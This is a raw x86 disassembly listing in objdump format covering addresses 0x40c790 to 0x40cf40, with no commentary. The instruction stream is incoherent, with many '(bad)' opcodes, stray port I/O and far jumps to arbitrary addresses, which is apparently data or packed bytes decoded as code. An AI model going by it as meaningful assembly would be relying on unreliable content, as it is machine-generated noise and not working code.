  40c790:	imul   edi,DWORD PTR [edx-0x46900540],0x85b4d9c6
  40c79a:	adc    al,0x54
  40c79c:	cdq    
  40c79d:	xor    eax,0x4238097
  40c7a2:	xor    dl,BYTE PTR [ebp-0x7e]
  40c7a5:	or     cx,sp
  40c7a8:	scas   al,BYTE PTR es:[edi]
  40c7a9:	js     0x40c7f2
  40c7ab:	xchg   edx,eax
  40c7ac:	gs pop ds
  40c7ae:	sbb    ebp,DWORD PTR [ecx]
  40c7b0:	aad    0xdd
  40c7b2:	(bad)  
  40c7b3:	fidiv  DWORD PTR [esi+0x56]
  40c7b6:	inc    ebp
  40c7b7:	lahf   
  40c7b8:	mov    bl,0xd
  40c7ba:	push   ds
  40c7bb:	push   edi
  40c7bc:	inc    eax
  40c7bd:	cmp    esp,DWORD PTR [ebx-0x80]
  40c7c0:	sub    eax,0xdc5218e2
  40c7c5:	sbb    BYTE PTR [ecx+0x13],bl
  40c7c8:	xor    bl,bl
  40c7ca:	inc    edi
  40c7cb:	push   0xe31d16db
  40c7d0:	xchg   DWORD PTR [esi-0x3b],esp
  40c7d3:	adc    al,0x7b
  40c7d5:	cwde   
  40c7d6:	push   ebp
  40c7d7:	fcom   DWORD PTR ds:0x189d36e8
  40c7dd:	lods   eax,DWORD PTR ds:[esi]
  40c7de:	mov    BYTE PTR [edi-0x31],dh
  40c7e1:	or     ch,bh
  40c7e3:	pop    edi
  40c7e4:	and    DWORD PTR [edi],esp
  40c7e6:	ins    BYTE PTR es:[edi],dx
  40c7e7:	or     DWORD PTR [edx],esi
  40c7e9:	adc    ebp,0x1226cf1d
  40c7ef:	imul   eax,DWORD PTR [esi],0x16
  40c7f2:	xor    esi,DWORD PTR [ecx-0x47ab2f8e]
  40c7f8:	hlt    
  40c7f9:	imul   DWORD PTR ds:0x253db68f
  40c7ff:	xor    BYTE PTR [edi+0x2d],0xca
  40c803:	mov    eax,0xd3fb6070
  40c808:	sbb    eax,0x43e3a628
  40c80d:	jg     0x40c840
  40c80f:	call   0x415c:0x52647da2
  40c816:	out    0x2,al
  40c818:	mov    DWORD PTR [edi+0x4a],ecx
  40c81b:	jecxz  0x40c837
  40c81d:	mov    esi,0x8098f8dd
  40c822:	out    0xd9,eax
  40c824:	jmp    0x90acbda4
  40c829:	jbe    0x40c89d
  40c82b:	gs push eax
  40c82d:	jmp    0x3f00:0x7e48f091
  40c834:	lock (bad) 
  40c836:	pop    ss
  40c837:	cld    
  40c838:	mov    cs,edi
  40c83a:	bound  eax,QWORD PTR [esi+esi*1]
  40c83d:	mov    ah,0x34
  40c83f:	adc    WORD PTR [edx],bp
  40c842:	stos   DWORD PTR es:[edi],eax
  40c843:	lods   al,BYTE PTR ds:[esi]
  40c844:	shr    BYTE PTR [ebp+0x49b644e7],0x63
  40c84b:	dec    ebp
  40c84c:	(bad)  
  40c84e:	ror    BYTE PTR [ecx-0x2f],cl
  40c851:	xchg   edi,eax
  40c852:	aad    0x60
  40c854:	ins    BYTE PTR es:[edi],dx
  40c855:	stos   DWORD PTR es:[edi],eax
  40c856:	add    DWORD PTR [ecx],ecx
  40c858:	in     al,dx
  40c859:	and    DWORD PTR [ecx+0x2684fff0],ebx
  40c85f:	adc    ebx,DWORD PTR [ebp+0x11346aa]
  40c865:	adc    bh,BYTE PTR [ecx-0x1de0a2e4]
  40c86b:	or     ch,BYTE PTR [ebp+0x28]
  40c86e:	adc    eax,0x3e5be2ec
  40c873:	dec    ecx
  40c874:	inc    eax
  40c875:	jne    0x40c893
  40c877:	rcl    BYTE PTR [ebx-0x23],0xd3
  40c87b:	jns    0x40c865
  40c87d:	stos   DWORD PTR es:[edi],eax
  40c87e:	or     ah,0xd8
  40c881:	or     DWORD PTR [eax+0x106af940],ebp
  40c887:	sbb    BYTE PTR [edx-0x18],dl
  40c88a:	in     eax,dx
  40c88b:	int    0xa2
  40c88d:	jecxz  0x40c865
  40c88f:	cmp    DWORD PTR [eax+0x260640f2],eax
  40c895:	inc    edi
  40c896:	or     BYTE PTR [edi-0x99ca78d],dl
  40c89c:	or     BYTE PTR [edx],bl
  40c89e:	jmp    0x40c876
  40c8a0:	(bad)
  40c8a4:	mov    eax,ds:0x3899d3d0
  40c8a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8aa:	fdiv   QWORD PTR [ebx+0x5d]
  40c8ad:	dec    ebp
  40c8ae:	cs add al,0x75
  40c8b1:	pusha  
  40c8b2:	bound  ecx,QWORD PTR [esi-0x6a35616b]
  40c8b8:	jae    0x40c874
  40c8ba:	push   edi
  40c8bb:	les    edx,FWORD PTR [ebx-0x26]
  40c8be:	fidiv  WORD PTR [ebp-0x14443470]
  40c8c4:	pop    edi
  40c8c5:	xor    al,0x77
  40c8c7:	dec    edx
  40c8c8:	dec    edi
  40c8c9:	ins    DWORD PTR es:[edi],dx
  40c8ca:	jle    0x40c923
  40c8cc:	jno    0x40c867
  40c8ce:	div    BYTE PTR [ebx+0x61]
  40c8d1:	push   esi
  40c8d2:	aaa    
  40c8d3:	pop    eax
  40c8d4:	es cmp al,0x48
  40c8d7:	adc    al,0xce
  40c8d9:	int3   
  40c8da:	sub    BYTE PTR [bx+si+0x16f2],dl
  40c8df:	dec    ebx
  40c8e0:	fstp   DWORD PTR ds:0xc388
  40c8e5:	enter  0x647c,0xeb
  40c8e9:	pop    ss
  40c8ea:	push   ebx
  40c8eb:	and    DWORD PTR [ebx],esp
  40c8ed:	mov    esi,0x44f792fc
  40c8f2:	dec    esp
  40c8f3:	cli    
  40c8f4:	sbb    al,0x99
  40c8f6:	mov    ah,0xd5
  40c8f8:	xlat   BYTE PTR ds:[ebx]
  40c8f9:	mov    esp,0x7f2f2918
  40c8fe:	in     al,0x3e
  40c900:	imul   ecx,DWORD PTR [eax],0x30da1de1
  40c906:	cwde   
  40c907:	and    eax,DWORD PTR [esi+0x173b72f4]
  40c90d:	lods   eax,DWORD PTR ds:[esi]
  40c90e:	jmp    0x9a1c:0x3355f496
  40c915:	sbb    al,0x36
  40c917:	in     eax,0x95
  40c919:	mov    ebx,ecx
  40c91b:	mov    dh,ch
  40c91d:	push   edx
  40c91e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c91f:	and    DWORD PTR [ecx],0x87e5aeea
  40c925:	les    esp,FWORD PTR ds:0x30f43b52
  40c92b:	push   ebx
  40c92c:	dec    DWORD PTR [ebp+ecx*8-0x34d178f4]
  40c933:	int3   
  40c934:	or     ebp,0x3ce5e4c4
  40c93a:	clc    
  40c93b:	cmp    cl,BYTE PTR [eax+0x3b]
  40c93e:	leave  
  40c93f:	fistp  DWORD PTR [edi+0x70113130]
  40c945:	retf   
  40c946:	and    esi,DWORD PTR [ebp-0x47]
  40c949:	das    
  40c94a:	pop    ecx
  40c94b:	jb     0x40c92f
  40c94d:	cmp    BYTE PTR [ebx-0x7c4f4b9a],ch
  40c953:	call   0x8616d5ed
  40c958:	xchg   edi,eax
  40c959:	mov    dl,0x89
  40c95b:	inc    edx
  40c95c:	popa   
  40c95d:	mov    ch,0x3b
  40c95f:	ins    DWORD PTR es:[edi],dx
  40c960:	jecxz  0x40c99f
  40c962:	xchg   edi,eax
  40c963:	push   ebp
  40c964:	mov    dl,0xc0
  40c966:	xchg   ebx,eax
  40c967:	jle    0x40c912
  40c969:	mov    edi,0xac259d37
  40c96e:	inc    edi
  40c96f:	cs mov ebx,0x8d497f1
  40c975:	cmc    
  40c976:	gs sbb eax,0x87688f46
  40c97c:	lods   eax,DWORD PTR ds:[esi]
  40c97d:	das    
  40c97e:	ret    0x76ca
  40c981:	dec    ecx
  40c982:	cmp    edi,eax
  40c984:	and    dh,bl
  40c986:	or     al,0xd8
  40c988:	ds stos BYTE PTR es:[edi],al
  40c98a:	and    ah,BYTE PTR [eax-0x5ff1b161]
  40c990:	es jecxz 0x40c988
  40c993:	in     al,0x72
  40c995:	add    BYTE PTR [eax-0x3c],cl
  40c998:	mov    eax,0xcaa7920b
  40c99d:	call   0xbfe17153
  40c9a2:	dec    ebx
  40c9a3:	(bad)  
  40c9a4:	fisttp WORD PTR [eax-0x1016a9cb]
  40c9aa:	mov    dl,0x67
  40c9ac:	xor    al,0xb6
  40c9ae:	jb     0x40c9e5
  40c9b0:	fist   DWORD PTR [esi-0x39]
  40c9b3:	pop    ebx
  40c9b4:	ss data16 ja 0x40ca1f
  40c9b8:	jmp    0x40c93f
  40c9ba:	jnp    0x40ca0c
  40c9bc:	inc    ebp
  40c9bd:	out    0xfe,al
  40c9bf:	shl    DWORD PTR [ebx+0x77f9ab54],1
  40c9c5:	and    DWORD PTR [ecx+ebp*2-0x1e],esp
  40c9c9:	sahf   
  40c9ca:	mov    ecx,0x3b500336
  40c9cf:	call   0x588f:0x71aa3189
  40c9d6:	mov    ebx,0xf9354431
  40c9db:	cmp    eax,0x2ffc8c74
  40c9e0:	mul    BYTE PTR [ebx+edx*4-0x471f592d]
  40c9e7:	les    ecx,FWORD PTR es:[ecx-0x1e]
  40c9eb:	jb     0x40ca31
  40c9ed:	test   eax,0xaf3fd1ff
  40c9f2:	push   0x822c961a
  40c9f7:	adc    BYTE PTR [ecx-0x15],cl
  40c9fa:	shl    edx,0x71
  40c9fd:	or     eax,0xdca209cf
  40ca02:	(bad)  
  40ca04:	jnp    0x40c9fa
  40ca06:	aam    0x98
  40ca08:	mov    dl,0xf
  40ca0a:	ficomp WORD PTR [ebx+0x14]
  40ca0d:	stc    
  40ca0e:	fsubr  st,st(7)
  40ca10:	test   BYTE PTR [edx-0xcf61e29],al
  40ca16:	(bad)  
  40ca17:	fiadd  DWORD PTR [esp+ecx*8+0x27]
  40ca1b:	jg     0x40c9dd
  40ca1d:	ret    0xaee7
  40ca20:	enter  0x4fbc,0x8b
  40ca24:	mov    WORD PTR [ecx-0x28da04b9],?
  40ca2a:	adc    DWORD PTR [ebp+edx*2-0x25],0x77d7c053
  40ca32:	gs mov edi,0x24993c8d
  40ca38:	xchg   esi,eax
  40ca39:	loopne 0x40ca2d
  40ca3b:	mov    al,ds:0x3f9f2b4
  40ca40:	jmp    0x40ca1d
  40ca42:	js     0x40ca29
  40ca44:	xchg   ebp,eax
  40ca45:	sub    di,si
  40ca48:	push   es
  40ca49:	test   DWORD PTR [edi+0xe79e2f],0x8ad2c49a
  40ca53:	adc    DWORD PTR [ebx-0x55],ecx
  40ca56:	dec    esp
  40ca57:	hlt    
  40ca58:	xchg   ebp,eax
  40ca59:	adc    cl,bl
  40ca5b:	mov    ah,0xdb
  40ca5d:	not    BYTE PTR [edi]
  40ca5f:	int    0xd5
  40ca61:	(bad)  
  40ca62:	xor    DWORD PTR [eax+0x7a],esp
  40ca65:	pop    ebx
  40ca66:	cmc    
  40ca67:	clc    
  40ca68:	pop    es
  40ca69:	xor    al,0xaf
  40ca6b:	pop    eax
  40ca6c:	add    esi,0x62
  40ca6f:	mov    al,0x4d
  40ca71:	mov    ch,0xcb
  40ca73:	or     eax,0xb6fcd54c
  40ca79:	jmp    0x61d8eb64
  40ca7e:	fs into 
  40ca80:	std    
  40ca81:	and    eax,0xcfa5db2b
  40ca86:	mov    ebx,0x198888c5
  40ca8b:	shr    ah,0x20
  40ca8e:	dec    ebp
  40ca8f:	es addr16 leave 
  40ca92:	stc    
  40ca93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca94:	test   al,0x1
  40ca96:	cdq    
  40ca97:	jnp    0x40caa8
  40ca99:	jge    0x40caf9
  40ca9b:	les    ecx,FWORD PTR [edi+0x36d5628e]
  40caa1:	mov    ah,BYTE PTR [esi]
  40caa3:	lahf   
  40caa4:	sbb    DWORD PTR [edi+0x18087bc],edx
  40caaa:	pushf  
  40caab:	mov    bh,BYTE PTR [edx+0x336d454b]
  40cab1:	les    ecx,FWORD PTR [edx+0x34255074]
  40cab7:	stos   DWORD PTR es:[edi],eax
  40cab8:	in     eax,0xff
  40caba:	sti    
  40cabb:	sbb    ecx,DWORD PTR [edi+0x3b92bcf1]
  40cac1:	push   ecx
  40cac2:	dec    ebp
  40cac3:	pop    esp
  40cac4:	sbb    DWORD PTR [eax+0x2102fbf0],esi
  40caca:	(bad)  
  40cacb:	leave  
  40cacc:	stc    
  40cacd:	xor    ecx,edx
  40cacf:	iret   
  40cad0:	aas    
  40cad1:	enter  0x3243,0x2c
  40cad5:	jbe    0x40ca74
  40cad7:	out    dx,eax
  40cad8:	or     ebx,DWORD PTR [edi+0x6d66552e]
  40cade:	mov    esi,0x956c5bcb
  40cae3:	inc    eax
  40cae4:	cs jmp 0xa9186a8a
  40caea:	cmc    
  40caeb:	jb     0x40cb66
  40caed:	and    DWORD PTR [ebp+0x61],ecx
  40caf0:	mov    bh,0x40
  40caf2:	stc    
  40caf3:	js     0x40cb3f
  40caf5:	nop
  40caf6:	sub    DWORD PTR [edi],esi
  40caf8:	(bad)  
  40caf9:	fiadd  DWORD PTR [ebp-0x5d81b849]
  40caff:	or     eax,0xc5304858
  40cb04:	retf   0x258f
  40cb07:	icebp  
  40cb08:	mov    ds:0xbdd53adf,eax
  40cb0d:	pushf  
  40cb0e:	test   al,0x53
  40cb10:	pop    eax
  40cb11:	push   es
  40cb12:	mov    bl,0xa1
  40cb14:	push   ds
  40cb15:	stos   BYTE PTR es:[edi],al
  40cb16:	jb     0x40caa7
  40cb18:	shld   esi,esi,cl
  40cb1b:	or     bh,BYTE PTR [esi-0x50333306]
  40cb21:	fisubr WORD PTR [esi-0x2c77646d]
  40cb27:	inc    ebp
  40cb28:	repz xor al,0x85
  40cb2b:	push   0x5dd3a727
  40cb30:	mov    ecx,0x94046030
  40cb35:	xor    BYTE PTR [ebx+0x4e],ah
  40cb38:	mov    WORD PTR [edx-0x4ce807e2],?
  40cb3e:	test   DWORD PTR [ecx],edx
  40cb40:	ret    
  40cb41:	pop    es
  40cb42:	cdq    
  40cb43:	xor    eax,0x61436275
  40cb48:	ss push cs
  40cb4a:	cs stos BYTE PTR es:[edi],al
  40cb4c:	ins    DWORD PTR es:[edi],dx
  40cb4d:	mov    BYTE PTR [edx+0x3a],al
  40cb50:	shr    edx,1
  40cb52:	push   ecx
  40cb53:	pop    esi
  40cb54:	jo     0x40cb64
  40cb56:	arpl   WORD PTR [esi],sp
  40cb58:	cmp    al,0x6c
  40cb5a:	and    edx,ecx
  40cb5c:	push   eax
  40cb5d:	fucomp st(2)
  40cb5f:	sub    DWORD PTR [eax-0x5c],0xc
  40cb63:	aam    0x6
  40cb65:	sar    BYTE PTR [ecx+ebp*2],0x98
  40cb69:	add    DWORD PTR [edx],edx
  40cb6b:	mov    edi,DWORD PTR [eax+0x66]
  40cb6e:	mov    esp,0x316dc1f0
  40cb73:	ret    
  40cb74:	cdq    
  40cb75:	dec    DWORD PTR ss:[eax]
  40cb78:	(bad)  
  40cb79:	aas    
  40cb7a:	lds    edx,FWORD PTR [esi-0x1e]
  40cb7d:	leave  
  40cb7e:	imul   ebx,DWORD PTR [edx+0x2a],0x3
  40cb82:	cli    
  40cb83:	pop    ebp
  40cb84:	inc    ebp
  40cb85:	dec    ebx
  40cb86:	mov    al,ds:0xf3239417
  40cb8b:	mov    eax,0x534bd67a
  40cb90:	dec    edi
  40cb91:	push   ebp
  40cb92:	jmp    0x8894b4d8
  40cb97:	mov    esi,ss
  40cb99:	inc    edi
  40cb9a:	sbb    DWORD PTR [esp+esi*1],ebp
  40cb9d:	enter  0x913f,0xe8
  40cba1:	xor    DWORD PTR [ecx+0x2f],edi
  40cba4:	fistp  QWORD PTR [ecx+0xa]
  40cba7:	das    
  40cba8:	xor    esi,DWORD PTR [ecx-0x7c]
  40cbab:	mov    esi,0x5a021c42
  40cbb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbb1:	xor    DWORD PTR [ecx+0x6c46ab3],ecx
  40cbb7:	xor    eax,0xc65a0ac9
  40cbbc:	sbb    al,0xf3
  40cbbe:	mov    cl,BYTE PTR [edi-0x2335699e]
  40cbc4:	mov    al,ds:0x9e1e9b5b
  40cbc9:	push   ds
  40cbca:	rol    cl,0x93
  40cbcd:	adc    ah,BYTE PTR [ebx+edx*1-0x74]
  40cbd1:	sti    
  40cbd2:	push   es
  40cbd3:	int3   
  40cbd4:	xor    al,0x33
  40cbd6:	sbb    BYTE PTR [edx+eiz*4-0x59],ch
  40cbda:	repz (bad) 
  40cbdc:	rol    BYTE PTR [esi+0x23ab650e],1
  40cbe2:	xor    DWORD PTR [esi],0xffffffca
  40cbe5:	xchg   ecx,eax
  40cbe6:	adc    ebx,edx
  40cbe8:	inc    ebp
  40cbe9:	ret    0x874
  40cbec:	xchg   ebp,eax
  40cbed:	mov    DWORD PTR [esi+0x4934b2b7],0x2cb6735d
  40cbf7:	adc    DWORD PTR [eax],0xffffff9b
  40cbfa:	pop    eax
  40cbfb:	mov    BYTE PTR [esi+0x1ff6e13a],cl
  40cc01:	cmp    al,0x1d
  40cc03:	outs   dx,DWORD PTR ds:[esi]
  40cc04:	in     al,dx
  40cc05:	outs   dx,DWORD PTR ds:[esi]
  40cc06:	imul   ecx,ebp,0x7e
  40cc09:	push   esi
  40cc0a:	cmp    eax,0x7c881af1
  40cc0f:	loop   0x40cc49
  40cc11:	add    dh,cl
  40cc13:	pop    ebp
  40cc14:	outs   dx,BYTE PTR ds:[esi]
  40cc15:	cmp    al,0xf3
  40cc17:	pop    edx
  40cc18:	pushf  
  40cc19:	jp     0x40cbbd
  40cc1b:	sahf   
  40cc1c:	fucomi st,st(5)
  40cc1e:	test   DWORD PTR [ecx-0x77],edi
  40cc21:	lods   eax,DWORD PTR ds:[esi]
  40cc22:	lds    edx,FWORD PTR [esi-0x4f]
  40cc25:	in     al,0x5f
  40cc27:	das    
  40cc28:	out    0x1f,eax
  40cc2a:	ins    BYTE PTR es:[edi],dx
  40cc2b:	push   0x8beddf8b
  40cc30:	nop
  40cc31:	aas    
  40cc32:	fchs   
  40cc34:	and    al,0x8f
  40cc37:	or     bh,BYTE PTR [eax+esi*2-0x7c6944ba]
  40cc3e:	adc    eax,DWORD PTR [eax]
  40cc40:	gs and eax,0xf069d3f8
  40cc46:	cld    
  40cc47:	push   edi
  40cc48:	mov    eax,ds:0xcb2f104e
  40cc4d:	ret    0xb3bf
  40cc50:	inc    BYTE PTR [esi+0x2c4d80b2]
  40cc56:	push   edi
  40cc57:	mov    dh,0xce
  40cc59:	inc    eax
  40cc5a:	xchg   ebx,eax
  40cc5b:	jbe    0x40cc12
  40cc5d:	es push ebx
  40cc5f:	fbld   TBYTE PTR [edi]
  40cc61:	les    esp,FWORD PTR [eax+0x4e]
  40cc64:	jecxz  0x40cc66
  40cc66:	hlt    
  40cc67:	bound  eax,QWORD PTR [esi+0x43c684cf]
  40cc6d:	xor    BYTE PTR [esp+ebp*4-0x7f3797ab],bh
  40cc74:	dec    ecx
  40cc75:	test   BYTE PTR [eax],dl
  40cc77:	rcr    BYTE PTR [ebx],1
  40cc79:	inc    esp
  40cc7a:	adc    eax,0x8f342cb9
  40cc7f:	jp     0x40ccab
  40cc81:	xchg   edi,eax
  40cc82:	int    0xcc
  40cc84:	stc    
  40cc85:	mov    edi,0xcc339b23
  40cc8a:	(bad)  
  40cc8b:	lods   eax,DWORD PTR ds:[esi]
  40cc8c:	sub    eax,DWORD PTR [edx-0x133b161]
  40cc92:	shr    BYTE PTR [ebp+0x741e92f4],0x43
  40cc99:	xor    eax,0xd4a72351
  40cc9e:	xchg   ebx,eax
  40cc9f:	push   ecx
  40cca0:	dec    edi
  40cca1:	and    esi,edx
  40cca3:	loop   0x40ccc8
  40cca5:	in     eax,0xa2
  40cca7:	dec    ebp
  40cca8:	js     0x40cc77
  40ccaa:	fldcw  WORD PTR [esi+0x206e165d]
  40ccb0:	aam    0x3a
  40ccb2:	outs   dx,BYTE PTR ds:[esi]
  40ccb3:	cld    
  40ccb4:	call   0xb664:0x99b55bba
  40ccbb:	push   cs
  40ccbc:	mov    eax,ds:0xf348931b
  40ccc1:	out    0xb,eax
  40ccc3:	repz and DWORD PTR cs:[ebx+0x70],ebp
  40ccc8:	data16 add cl,0x6e
  40cccc:	pop    ecx
  40cccd:	xor    BYTE PTR [ebx-0x19],dh
  40ccd0:	lahf   
  40ccd1:	nop    edi
  40ccd4:	ds adc al,0x86
  40ccd7:	addr16 sub al,0xb0
  40ccda:	sbb    BYTE PTR [edx+0x70],bl
  40ccdd:	cli    
  40ccde:	push   esp
  40ccdf:	push   esi
  40cce0:	pop    eax
  40cce1:	jle    0x40cd06
  40cce3:	inc    ch
  40cce5:	sbb    dl,cl
  40cce7:	out    0x34,al
  40cce9:	pop    ebx
  40ccea:	jecxz  0x40ccfa
  40ccec:	icebp  
  40cced:	mov    ah,0xc
  40ccef:	dec    esi
  40ccf0:	std    
  40ccf1:	loopne 0x40cceb
  40ccf3:	data16 adc al,0xdc
  40ccf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccf7:	popf   
  40ccf8:	jne    0x40cd72
  40ccfa:	push   eax
  40ccfb:	pop    edx
  40ccfc:	jo     0x40ccea
  40ccfe:	jmp    0x40cd5e
  40cd00:	in     eax,dx
  40cd01:	inc    esi
  40cd02:	(bad)  
  40cd03:	shl    bh,1
  40cd05:	data16 jo 0x40cc91
  40cd08:	cli    
  40cd09:	jp     0x40ccc8
  40cd0b:	pop    es
  40cd0c:	xlat   BYTE PTR ds:[ebx]
  40cd0d:	add    al,0x8
  40cd0f:	xor    DWORD PTR [edx+edi*1],ebx
  40cd12:	push   edi
  40cd13:	dec    ebp
  40cd14:	and    esi,DWORD PTR [eax-0x4d]
  40cd17:	rol    DWORD PTR [ebp-0x76e3e057],0xe5
  40cd1e:	mov    al,ds:0x488f869c
  40cd23:	out    dx,eax
  40cd24:	add    eax,0x343df1fc
  40cd29:	push   ds
  40cd2a:	pop    ecx
  40cd2b:	aaa    
  40cd2c:	pop    ebx
  40cd2d:	push   ebp
  40cd2e:	sub    ebx,DWORD PTR [ecx-0x743e0e2a]
  40cd34:	inc    ecx
  40cd35:	and    eax,0x5b5bef2a
  40cd3a:	fld    TBYTE PTR [eax]
  40cd3c:	add    eax,0xfad944f3
  40cd41:	xchg   ebx,eax
  40cd42:	stos   DWORD PTR es:[edi],eax
  40cd43:	imul   esp,edx,0x2b2d077c
  40cd49:	in     al,dx
  40cd4a:	retf   0x7b83
  40cd4d:	rcl    DWORD PTR [ebx],1
  40cd4f:	or     bl,BYTE PTR [ebp+ebx*4+0x54]
  40cd53:	dec    ecx
  40cd54:	call   0x712d2839
  40cd59:	shl    ecx,0x30
  40cd5c:	xchg   DWORD PTR [esi],ebp
  40cd5e:	lods   eax,DWORD PTR ds:[esi]
  40cd5f:	(bad)  
  40cd60:	jb     0x40cd7b
  40cd62:	mov    ebp,0x5042f153
  40cd67:	pcmpgtb mm2,QWORD PTR [ecx+edx*8-0x262346f3]
  40cd6f:	xor    DWORD PTR [edi],ebx
  40cd71:	xor    dh,BYTE PTR [eax-0x364b3415]
  40cd77:	imul   edi,DWORD PTR [ecx+eax*2],0x9e808dc5
  40cd7e:	cmp    eax,0x7ebb8f1c
  40cd83:	loopne 0x40cdcf
  40cd85:	or     DWORD PTR [edx-0x76],eax
  40cd88:	ds jb  0x40cd92
  40cd8b:	mov    bl,0x54
  40cd8d:	fdiv   st(4),st
  40cd8f:	aas    
  40cd90:	not    DWORD PTR [eax+0x75]
  40cd93:	mov    ebx,0x416926e
  40cd98:	jb     0x40cdff
  40cd9a:	mov    cl,BYTE PTR [esi]
  40cd9c:	cwde   
  40cd9d:	sub    bh,BYTE PTR [eax]
  40cd9f:	adc    cl,BYTE PTR [esi+0x4315d487]
  40cda5:	jle    0x40cd42
  40cda7:	stos   BYTE PTR es:[edi],al
  40cda8:	push   edi
  40cda9:	div    ebp
  40cdab:	add    edi,ebp
  40cdad:	mov    bl,0x1
  40cdaf:	mov    esp,0xa39b66e
  40cdb4:	inc    eax
  40cdb5:	adc    DWORD PTR [ecx],edx
  40cdb7:	jb     0x40cd83
  40cdb9:	push   esi
  40cdba:	js     0x40cdce
  40cdbc:	into   
  40cdbd:	xchg   ecx,eax
  40cdbe:	push   esi
  40cdbf:	jle    0x40ce39
  40cdc1:	sub    edi,DWORD PTR ss:[edi]
  40cdc4:	or     dh,BYTE PTR [ecx]
  40cdc6:	pop    ss
  40cdc7:	jl     0x40cd5b
  40cdc9:	xor    dl,BYTE PTR [eax+edx*1+0x1ba87310]
  40cdd0:	imul   edi,eax,0xbb109896
  40cdd6:	mov    ds:0x9685347d,al
  40cddb:	retf   0x4f73
  40cdde:	std    
  40cddf:	mov    edx,0x1ee6942
  40cde4:	push   0x36cbeb18
  40cde9:	pusha  
  40cdea:	mov    WORD PTR [ebp-0x78],ss
  40cded:	sub    al,al
  40cdef:	jno    0x40cd8c
  40cdf1:	outs   dx,BYTE PTR ds:[esi]
  40cdf2:	jle    0x40ce64
  40cdf4:	sbb    edx,DWORD PTR [eax+0x54]
  40cdf7:	jmp    0x40ce70
  40cdf9:	leave  
  40cdfa:	adc    ah,BYTE PTR [ecx]
  40cdfc:	mov    ch,0xf0
  40cdfe:	(bad)  
  40cdff:	js     0x40ce50
  40ce01:	mov    ss,WORD PTR [edx]
  40ce03:	inc    esi
  40ce04:	add    DWORD PTR [ebx],eax
  40ce06:	pop    eax
  40ce07:	cmp    eax,0xb5ab0c11
  40ce0d:	jle    0x40ce8d
  40ce0f:	ret    
  40ce10:	pop    esp
  40ce11:	inc    edx
  40ce12:	cmp    bl,0xe9
  40ce15:	cmp    ch,BYTE PTR [ebx+0x39]
  40ce18:	sub    bl,BYTE PTR [ebx*2-0x3eac7d5c]
  40ce1f:	pop    edi
  40ce20:	push   0x43105dc2
  40ce25:	mov    esp,0x261d4b98
  40ce2a:	pop    ebp
  40ce2b:	imul   esp,DWORD PTR ds:0x45b01315,0xae75c422
  40ce35:	sbb    BYTE PTR [ecx-0x692b1617],cl
  40ce3b:	xor    esi,DWORD PTR [eax+0x5f]
  40ce3e:	test   ch,dh
  40ce40:	retf   0xa5a5
  40ce43:	ficomp WORD PTR [eax]
  40ce45:	sbb    eax,0xb348093d
  40ce4a:	cmp    eax,0xe2629ac1
  40ce4f:	mov    bh,0xe6
  40ce51:	inc    esi
  40ce52:	mov    ds:0x1de3f397,eax
  40ce57:	push   cs
  40ce58:	and    BYTE PTR [edx],al
  40ce5a:	jns    0x40ce5c
  40ce5c:	repnz shl dh,0x7
  40ce60:	sub    dl,BYTE PTR [edx+ebx*2-0x86a38e5]
  40ce67:	stos   BYTE PTR es:[edi],al
  40ce68:	mov    ds:0xe3fd2db2,eax
  40ce6d:	lea    edx,[esi]
  40ce6f:	sbb    BYTE PTR [edx-0x1],bh
  40ce72:	sbb    eax,eax
  40ce74:	pop    edi
  40ce75:	cmp    BYTE PTR [edi+0x7e],bl
  40ce78:	cs xor bh,cl
  40ce7b:	adc    bl,0xcc
  40ce7e:	pusha  
  40ce7f:	out    0x11,al
  40ce81:	or     eax,0xf352058a
  40ce86:	push   edx
  40ce87:	or     bh,BYTE PTR [esi+0x6a51f622]
  40ce8d:	jmp    0xc60a:0x25ac2aa0
  40ce94:	sbb    eax,0x66e765f9
  40ce99:	mov    ah,0x1d
  40ce9b:	dec    edi
  40ce9c:	mov    ds:0x7ccb8ee3,al
  40cea1:	or     edi,DWORD PTR [ebx-0x1292da8b]
  40cea7:	mov    bh,0xe0
  40cea9:	in     al,0x46
  40ceab:	int3   
  40ceac:	pop    ebx
  40cead:	adc    DWORD PTR [esi],esi
  40ceaf:	out    dx,al
  40ceb0:	aam    0x5e
  40ceb2:	je     0x40ce62
  40ceb4:	push   edx
  40ceb5:	add    ecx,ecx
  40ceb7:	jno    0x40ced4
  40ceb9:	jae    0x40ce8f
  40cebb:	test   DWORD PTR ds:0xd1ccdb67,0x9f83b495
  40cec5:	and    DWORD PTR [ecx-0x38],ebp
  40cec8:	pop    esi
  40cec9:	mov    ebp,0xc7dfeba
  40cece:	shl    DWORD PTR [eax+0x6a],cl
  40ced1:	pop    ebx
  40ced2:	dec    esp
  40ced3:	lods   eax,DWORD PTR ds:[esi]
  40ced4:	out    0x16,al
  40ced6:	pop    ss
  40ced7:	jmp    0x47afaa07
  40cedc:	push   cs
  40cedd:	in     eax,0x52
  40cedf:	and    al,0x86
  40cee1:	xchg   ebx,eax
  40cee2:	dec    esi
  40cee3:	push   esp
  40cee4:	outs   dx,DWORD PTR ds:[esi]
  40cee5:	call   0x42e7:0x2b97e151
  40ceec:	fst    DWORD PTR [ebx+0x3538af2e]
  40cef2:	inc    ecx
  40cef3:	xchg   esi,eax
  40cef4:	xor    eax,0xc4c2e80c
  40cef9:	cld    
  40cefa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cefb:	sub    DWORD PTR [eax*1-0x34d86f9],esp
  40cf02:	sub    eax,0x1e81c836
  40cf07:	xchg   BYTE PTR [ecx+ecx*2+0x1c],dl
  40cf0b:	mov    edi,0x1efcfe50
  40cf10:	or     BYTE PTR [esi],0x2
  40cf13:	js     0x40cee1
  40cf15:	xchg   ebx,eax
  40cf16:	mov    ds,WORD PTR [ebx-0x38fd972b]
  40cf1c:	out    dx,eax
  40cf1d:	push   ss
  40cf1e:	jae    0x40ceca
  40cf20:	jnp    0x40cf3c
  40cf22:	and    esp,DWORD PTR [edx]
  40cf24:	pop    ecx
  40cf25:	sub    ecx,edx
  40cf27:	add    esi,0x9e4434c9
  40cf2d:	mov    BYTE PTR [ecx-0x524301c1],dl
  40cf33:	jg     0x40cf83
  40cf35:	adc    eax,DWORD PTR [eax-0x18866a87]
  40cf3b:	mov    ebp,0xbb6182a1
  40cf40:	shl    BYTE PTR [eax+0x70],cl
